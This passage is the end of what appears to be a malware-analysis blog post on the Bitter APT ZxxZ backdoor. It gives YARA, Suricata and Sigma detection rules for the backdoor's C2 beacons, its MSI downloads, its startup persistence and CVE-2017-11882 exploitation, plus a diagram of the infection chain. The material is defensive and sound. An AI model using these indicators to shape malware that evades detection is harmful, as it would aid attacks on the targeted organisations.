+</span></span><span class=line><span class=cl>	<span class=n>strings</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=err>$</span><span class=n>project_name_0</span> <span class=o>=</span> <span class=s2>&#34;NewProject_&#34;</span> <span class=n>ascii</span> <span class=n>wide</span>
+</span></span><span class=line><span class=cl>	<span class=n>condition</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>		<span class=n>uint16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x5a4d</span> <span class=ow>and</span>
+</span></span><span class=line><span class=cl>        <span class=n>uint32</span><span class=p>(</span><span class=n>uint32</span><span class=p>(</span><span class=mh>0x3c</span><span class=p>))</span> <span class=o>==</span> <span class=mh>0x00004550</span> <span class=ow>and</span>
+</span></span><span class=line><span class=cl>        <span class=nb>any</span> <span class=n>of</span> <span class=p>(</span><span class=err>$</span><span class=n>project_name_</span><span class=o>*</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=suricata>Suricata</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>alert</span> <span class=n>http</span> <span class=err>$</span><span class=n>HOME_NET</span> <span class=nb>any</span> <span class=o>-&gt;</span> <span class=err>$</span><span class=n>EXTERNAL_NET</span> <span class=nb>any</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=n>msg</span><span class=p>:</span><span class=s2>&#34;MALWARE Bitter APT ZxxZ Backdoor C2 Checkin&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;GET&#34;</span><span class=p>;</span> <span class=n>http_method</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;&amp;&amp;&#34;</span><span class=p>;</span> <span class=n>http_uri</span><span class=p>;</span> <span class=n>fast_pattern</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;OsI=&#34;</span><span class=p>;</span> <span class=n>http_uri</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=err>!</span><span class=s2>&#34;User-Agent|3a 20|&#34;</span><span class=p>;</span> <span class=n>http_header</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>flow</span><span class=p>:</span><span class=n>to_server</span><span class=p>,</span> <span class=n>established</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>reference</span><span class=p>:</span><span class=n>url</span><span class=p>,</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>c3rb3ru5d3d53c</span><span class=o>.</span><span class=n>github</span><span class=o>.</span><span class=n>io</span><span class=o>/</span><span class=n>malware</span><span class=o>-</span><span class=n>blog</span><span class=o>/</span><span class=mi>2022</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=n>bitter</span><span class=o>-</span><span class=n>apt</span><span class=o>-</span><span class=n>zxxz</span><span class=o>-</span><span class=n>backdoor</span><span class=o>/</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>metadata</span><span class=p>:</span><span class=n>created</span> <span class=mi>2022</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>30</span><span class=p>,</span> <span class=nb>type</span> <span class=n>malware</span><span class=o>.</span><span class=n>backdoor</span><span class=p>,</span> <span class=n>os</span> <span class=n>windows</span><span class=p>,</span> <span class=n>tlp</span> <span class=n>white</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>classtype</span><span class=p>:</span><span class=n>trojan</span><span class=o>-</span><span class=n>activity</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>sid</span><span class=p>:</span><span class=mi>1000016</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>rev</span><span class=p>:</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alert</span> <span class=n>http</span> <span class=err>$</span><span class=n>HOME_NET</span> <span class=nb>any</span> <span class=o>-&gt;</span> <span class=err>$</span><span class=n>EXTERNAL_NET</span> <span class=nb>any</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=n>msg</span><span class=p>:</span><span class=s2>&#34;MALWARE Bitter APT ZxxZ Backdoor C2 Beacon&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;GET&#34;</span><span class=p>;</span> <span class=n>http_method</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;ZxxZ&#34;</span><span class=p>;</span> <span class=n>http_uri</span><span class=p>;</span> <span class=n>fast_pattern</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>pcre</span><span class=p>:</span><span class=s2>&#34;/=(RNG|DN-S|S|RN_E)/U&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>flow</span><span class=p>:</span><span class=n>to_server</span><span class=p>,</span> <span class=n>established</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>reference</span><span class=p>:</span><span class=n>url</span><span class=p>,</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>c3rb3ru5d3d53c</span><span class=o>.</span><span class=n>github</span><span class=o>.</span><span class=n>io</span><span class=o>/</span><span class=n>malware</span><span class=o>-</span><span class=n>blog</span><span class=o>/</span><span class=mi>2022</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=n>bitter</span><span class=o>-</span><span class=n>apt</span><span class=o>-</span><span class=n>zxxz</span><span class=o>-</span><span class=n>backdoor</span><span class=o>/</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>metadata</span><span class=p>:</span><span class=n>created</span> <span class=mi>2022</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>30</span><span class=p>,</span> <span class=nb>type</span> <span class=n>malware</span><span class=o>.</span><span class=n>backdoor</span><span class=p>,</span> <span class=n>os</span> <span class=n>windows</span><span class=p>,</span> <span class=n>tlp</span> <span class=n>white</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>classtype</span><span class=p>:</span><span class=n>trojan</span><span class=o>-</span><span class=n>activity</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>sid</span><span class=p>:</span><span class=mi>1000017</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>rev</span><span class=p>:</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>alert</span> <span class=n>http</span> <span class=err>$</span><span class=n>HOME_NET</span> <span class=nb>any</span> <span class=o>-&gt;</span> <span class=err>$</span><span class=n>EXTERNAL_NET</span> <span class=nb>any</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>	<span class=n>msg</span><span class=p>:</span><span class=s2>&#34;HEURISTIC Suspicious MSI Installer Activity&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;GET&#34;</span><span class=p>;</span> <span class=n>http_method</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>content</span><span class=p>:</span><span class=s2>&#34;Windows Installer&#34;</span><span class=p>;</span> <span class=n>http_user_agent</span><span class=p>;</span> <span class=n>fast_pattern</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>pcre</span><span class=p>:</span><span class=s2>&#34;/\.com\.pk|xyz|tk|top|hopto\.org|linkpc\.net|portmap\.io|ngrok\.io|ddns\.net|duckdns\.org)$/W&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>flow</span><span class=p>:</span><span class=n>to_server</span><span class=p>,</span> <span class=n>established</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>reference</span><span class=p>:</span><span class=n>url</span><span class=p>,</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>c3rb3ru5d3d53c</span><span class=o>.</span><span class=n>github</span><span class=o>.</span><span class=n>io</span><span class=o>/</span><span class=n>malware</span><span class=o>-</span><span class=n>blog</span><span class=o>/</span><span class=mi>2022</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=n>bitter</span><span class=o>-</span><span class=n>apt</span><span class=o>-</span><span class=n>zxxz</span><span class=o>-</span><span class=n>backdoor</span><span class=o>/</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>metadata</span><span class=p>:</span><span class=n>created</span> <span class=mi>2022</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>04</span><span class=p>,</span> <span class=nb>type</span> <span class=n>heuristic</span><span class=p>,</span> <span class=n>os</span> <span class=n>windows</span><span class=p>,</span> <span class=n>tlp</span> <span class=n>white</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>classtype</span><span class=p>:</span><span class=n>misc</span><span class=o>-</span><span class=n>attack</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>sid</span><span class=p>:</span><span class=mi>1000015</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>rev</span><span class=p>:</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=sigma>Sigma</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>id</span><span class=p>:</span><span class=w> </span><span class=l>eb65d88b-3f45-4ed4-bb51-23b39bbcf9e3</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>title</span><span class=p>:</span><span class=w> </span><span class=l>HEURISTIC Suspicious Startup File Created</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>description</span><span class=p>:</span><span class=w> </span><span class=l>Detects suspicious startup files being created</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>reference</span><span class=p>:</span><span class=w> </span><span class=l>https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>author</span><span class=p>:</span><span class=w> </span><span class=l>c3rb3ru5d3d53c</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>created</span><span class=p>:</span><span class=w> </span><span class=ld>2022-06-30</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>heuristic</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>os</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>tlp</span><span class=p>:</span><span class=w> </span><span class=l>white</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>rev</span><span class=p>:</span><span class=w> </span><span class=m>1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>logsource</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>product</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>category</span><span class=p>:</span><span class=w> </span><span class=l>file_creation</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>detection</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>selection_0</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>TargetFilename|contains</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s1>&#39;\Start Menu\Programs\Startup\&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>  selection_1:
+</span></span></span><span class=line><span class=cl><span class=s1>    TargetFilename|endswith:
+</span></span></span><span class=line><span class=cl><span class=s1>      - &#39;</span><span class=l>\update.LNK&#39;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>condition</span><span class=p>:</span><span class=w> </span><span class=l>selection_0 and selection_1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>falsepositives</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=l>Unknown</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>id</span><span class=p>:</span><span class=w> </span><span class=l>c2b9e035-f225-49f9-8161-776b64ab16d0</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>title</span><span class=p>:</span><span class=w> </span><span class=l>HEURISTIC Suspicious Process Created in AppData Folder</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>description</span><span class=p>:</span><span class=w> </span><span class=l>Detects suspicious startup files being created</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>reference</span><span class=p>:</span><span class=w> </span><span class=l>https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>author</span><span class=p>:</span><span class=w> </span><span class=l>c3rb3ru5d3d53c</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>created</span><span class=p>:</span><span class=w> </span><span class=ld>2022-06-30</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>heuristic</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>os</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>tlp</span><span class=p>:</span><span class=w> </span><span class=l>white</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>rev</span><span class=p>:</span><span class=w> </span><span class=m>1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>logsource</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>product</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>category</span><span class=p>:</span><span class=w> </span><span class=l>process_creation</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>detection</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>selection_0</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>Image|contains</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span>- <span class=s1>&#39;\AppData\Local\&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>  selection_1:
+</span></span></span><span class=line><span class=cl><span class=s1>    Image|endswith:
+</span></span></span><span class=line><span class=cl><span class=s1>      - &#39;</span><span class=l>\tmp.exe&#39;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>condition</span><span class=p>:</span><span class=w> </span><span class=l>selection_0 and selection_1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>falsepositives</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=l>Unknown</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yml data-lang=yml><span class=line><span class=cl><span class=nt>id</span><span class=p>:</span><span class=w> </span><span class=l>653014f7-1b43-4355-8616-c521baac9bf4</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>title</span><span class=p>:</span><span class=w> </span><span class=l>EXPLOIT Equation Editor Exploit RCE (CVE-2017-11882)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>description</span><span class=p>:</span><span class=w> </span><span class=l>Detects exploitation of CVE-2017-11882</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>reference</span><span class=p>:</span><span class=w> </span><span class=l>https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>created</span><span class=p>:</span><span class=w> </span><span class=ld>2022-07-04</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>type</span><span class=p>:</span><span class=w> </span><span class=l>exploit.rce</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>os</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>tlp</span><span class=p>:</span><span class=w> </span><span class=l>white</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>rev</span><span class=p>:</span><span class=w> </span><span class=m>1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>logsource</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>category</span><span class=p>:</span><span class=w> </span><span class=l>process_creation</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>product</span><span class=p>:</span><span class=w> </span><span class=l>windows</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>detection</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>selection_0</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ParentImage|endswith</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	  </span>- <span class=s1>&#39;\EQNEDT32.EXE&#39;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>condition</span><span class=p>:</span><span class=w> </span><span class=l>selection_0</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>falsepositives</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span>- <span class=l>Unknown</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>All these signatures are available on my <a href=https://github.com/c3rb3ru5d3d53c/signatures/ target=_blank rel="noopener noreffer">signatures</a> GitHub repository.</p><h2 id=references>References</h2><ul><li><a href=https://twitter.com/ShadowChasing1/status/1478259210110775297 target=_blank rel="noopener noreffer">ShadowChasing1 Tweet</a></li><li><a href=https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html target=_blank rel="noopener noreffer">Bitter APT adds Bangladesh to their targets</a></li><li><a href=https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh/ target=_blank rel="noopener noreffer">Whatever floats your Boat – Bitter APT continues to target Bangladesh</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&mid=2247495644&idx=1&sn=f09a360fa8630fa55eb09c08357d7627&scene=21#wechat_redirect" target=_blank rel="noopener noreffer">Bitter APT Operation Magichm</a></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-06-26</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/ data-title="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee" data-via=c3rb3ru5d3d53c data-hashtags=Rust,Reversing,Guide><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/ data-hashtag=Rust><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/ data-title="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/><i class="fab fa-reddit fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/ data-title="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://c3rb3r3u5d3d53c.github.io/2022/06/bitter-apt-zxxz-backdoor/ data-title="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/rust/>Rust</a>,&nbsp;<a href=/tags/reversing/>Reversing</a>,&nbsp;<a href=/tags/guide/>Guide</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2022/06/malware-analysis-beginner-guide/ class=prev rel=prev title="Beginner Malware Analyst CopyPasta"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Beginner Malware Analyst CopyPasta</a>
+<a href=/2022/07/malware-reversing-workflow/ class=next rel=next title="Malware Analysis and Reverse Engineering Workflow">Malware Analysis and Reverse Engineering Workflow<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2019 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://c3rb3r3u5d3d53c.github.io target=_blank>c3rb3r3u5d3d53c</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/mermaid@9.1.3/dist/mermaid.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},data:{"id-1":`  graph LR
+	subgraph Exploitation
+		0(RTF Document) \u0026 1(Shellcode)
+	end
+	subgraph Post Exploitation
+		2(MSI Installer) --\u003e|extract| 3(CAB Archive) --\u003e|extract| 4(Payload)
+	end
+	 0 --\u003e|CVE-2017-1182| 1
+	 1 --\u003e|download| 2`,"id-2":"Malware Hell","id-3":"Malware Hell"},lightgallery:!0,search:{algoliaAppID:"",algoliaIndex:"",algoliaSearchKey:"",highlightTag:"em",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"algolia"},twemoji:!0,typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"id-2":["id-2"],"id-3":["id-3"]},duration:-1,speed:100}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
